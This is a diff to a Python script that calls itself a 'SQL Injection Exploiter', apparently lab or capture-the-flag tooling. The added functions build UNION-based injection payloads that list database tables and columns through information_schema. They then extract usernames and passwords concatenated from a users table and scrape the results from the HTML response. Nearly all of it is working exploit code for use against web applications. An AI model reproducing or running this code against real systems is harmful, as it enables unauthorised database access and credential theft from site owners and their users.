@@ -74,6 +74,32 @@ def exploit_sqli_string_field(url, num_col, method, post_data=None):
                 return i
         return False
 
+def generate_sql_payload(num_columns, text_column_index, detail, users_table=None):
+    null_columns = ["NULL"] * num_columns
+    null_columns[text_column_index - 1] = detail
+    if detail == "table_name":
+        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM information_schema.tables--"
+    elif detail == "column_name":
+        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + f" FROM information_schema.columns WHERE table_name = '{users_table}'--"
+    elif detail == "all":
+        null_columns[text_column_index - 1] = "CONCAT(username, '~~', password)"
+        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM users--"
+    return sql_payload
+
+def exploit_sqli_users_table(url, method, post_data=None):
+    global num_col
+    num_col = exploit_sqli_column_number(url, method, post_data)
+    if num_col:
+        global string_column
+        string_column = exploit_sqli_string_field(url, num_col, method, post_data)
+        if string_column:
+            sql_payload = generate_sql_payload(num_col, string_column, "table_name")
+            res = perform_request(url, sql_payload, method, post_data)
+            soup = BeautifulSoup(res.text, 'html.parser')
+            users_table = soup.find(text=re.compile('.*users.*'))
+            return users_table, num_col, string_column
+    return None, None, None
+
 
 def main():
     parser = argparse.ArgumentParser(description="SQL Injection Exploiter")
